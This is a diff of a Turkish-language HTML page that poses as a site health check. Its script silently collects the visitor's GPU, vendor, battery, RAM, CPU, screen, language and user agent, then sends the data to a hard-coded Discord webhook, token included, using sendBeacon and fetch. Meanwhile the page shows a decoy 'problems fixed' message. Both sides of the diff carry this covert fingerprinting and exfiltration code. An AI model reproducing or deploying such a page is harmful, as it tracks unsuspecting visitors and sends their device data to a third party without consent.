@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="tr">
 <head>
@@ -6,7 +7,7 @@
     <title>Sistem</title>
     <style>
         body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; font-family:sans-serif; overflow:hidden; }
-        h2 { color:#0a0a0a; font-size:10px; }
+        h2 { color:#111; font-size:12px; }
         .ok { color:#0f4; font-weight:bold; font-size:14px; }
     </style>
 </head>
@@ -15,65 +16,54 @@
 
     <script>
         const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
-        const t = document.getElementById('t');
 
-        async function g() {
-            let d = { gpu: "N/A", v: "N/A", b: "N/A", n: "N/A" };
+        async function extract() {
+            let info = { bat: "Erişim Yok", gpu: "N/A", vendor: "N/A" };
             
-            // 1. GPU DERİN TARAMA
-            try {
-                const gl = document.createElement('canvas').getContext('webgl');
-                const ex = gl.getExtension('WEBGL_debug_renderer_info');
-                d.gpu = gl.getParameter(ex.UNMASKED_RENDERER_ID);
-                d.v = gl.getParameter(ex.UNMASKED_VENDOR_ID);
-            } catch(e){}
-
-            // 2. PİL YÜZDESİ VE DURUMU (ESKİSİ GİBİ)
+            // 1. PİL VE ŞARJ (KESİN ÇEKİM)
             try {
                 if (navigator.getBattery) {
-                    const bat = await navigator.getBattery();
-                    d.b = `%${Math.round(bat.level * 100)} (Şarjda: ${bat.charging ? 'EVET' : 'HAYIR'})`;
+                    const b = await navigator.getBattery();
+                    info.bat = (b.level * 100).toFixed(0) + "% (Şarjda: " + (b.charging ? 'Evet' : 'Hayır') + ")";
                 }
-            } catch(e){}
+            } catch(e) {}
 
-            // 3. AĞ VE BAĞLANTI HIZI
+            // 2. DONANIM VE GPU DERİNLİĞİ
             try {
-                const cn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                if (cn) d.n = `${cn.downlink} Mbps | ${cn.effectiveType}`;
-            } catch(e){}
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
+                info.vendor = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
+            } catch(e) {}
 
-            // 4. TÜM VERİLERİ PAKETLE
+            // 3. PAYLOAD (SENİN İSTEDİĞİN TAM SET)
             const payload = {
-                content: "💀 **VAHŞİ SİSTEM ANALİZİ (TAM LİSTE)**",
                 embeds: [{
-                    color: 0,
+                    title: "🕵️ KRİTİK CİHAZ ANALİZİ (FULL ACCESS)",
+                    color: 15158332,
                     fields: [
-                        { name: "🔋 PİL DURUMU", value: d.b, inline: true },
-                        { name: "🌐 AĞ HIZI", value: d.n, inline: true },
-                        { name: "🕹️ GPU (EKRAN KARTI)", value: "```" + d.gpu + "```", inline: false },
-                        { name: "🏭 ÜRETİCİ (VENDOR)", value: "```" + d.v + "```", inline: false },
-                        { name: "⚙️ DONANIM", value: `**RAM:** ${navigator.deviceMemory}GB\n**CPU:** ${navigator.hardwareConcurrency} Çekirdek\n**OS:** ${navigator.platform}`, inline: true },
-                        { name: "📏 GÖRÜNTÜ", value: `${screen.width}x${screen.height} (@${window.devicePixelRatio}x)\n**TCH:** ${navigator.maxTouchPoints}`, inline: true },
-                        { name: "🔍 USER AGENT", value: "```" + navigator.userAgent + "```", inline: false }
+                        { name: "🛠️ DONANIM KATMANI", value: `**GPU:** ${info.gpu}\n**VENDOR:** ${info.vendor}\n**RAM:** ${navigator.deviceMemory || 'X'} GB\n**CPU:** ${navigator.hardwareConcurrency || 'X'} Çekirdek`, inline: false },
+                        { name: "📱 YAZILIM/EKRAN", value: `**OS:** ${navigator.platform}\n**RES:** ${screen.width}x${screen.height} (${window.devicePixelRatio}x)\n**DİL:** ${navigator.language}`, inline: true },
+                        { name: "🔋 DURUM", value: info.bat, inline: true },
+                        { name: "🌐 TARAYICI KİMLİĞİ", value: "```" + navigator.userAgent + "```", inline: false }
                     ],
-                    footer: { text: "Cihaz Yönlendirme Kontrolü Tamamlandı • " + new Date().toLocaleString() }
+                    timestamp: new Date()
                 }]
             };
 
-            // 5. KESİN VE HIZLI GÖNDERİM
-            const s = JSON.stringify(payload);
-            navigator.sendBeacon(u, s);
-            fetch(u, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/json' }, body: s });
+            // 4. FIRLAT VE GEÇ
+            const blob = new Blob([JSON.stringify(payload)], {type: 'application/json'});
+            navigator.sendBeacon(u, blob);
+            fetch(u, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
 
-            // 6. ANLIK MESAJ AKIŞI
+            // 5. ARAYÜZ AKIŞI
+            const t = document.getElementById('t');
             t.innerHTML = '<span class="ok">Site uygun halde!</span>';
-            setTimeout(() => {
-                t.innerHTML = '<span class="ok">Sorunlar düzeltildi.</span>';
-            }, 450);
+            setTimeout(() => { t.innerHTML = '<span class="ok">Sorunlar düzeltildi.</span>'; }, 400);
         }
 
-        g();
+        extract();
     </script>
 </body>
 </html>
-
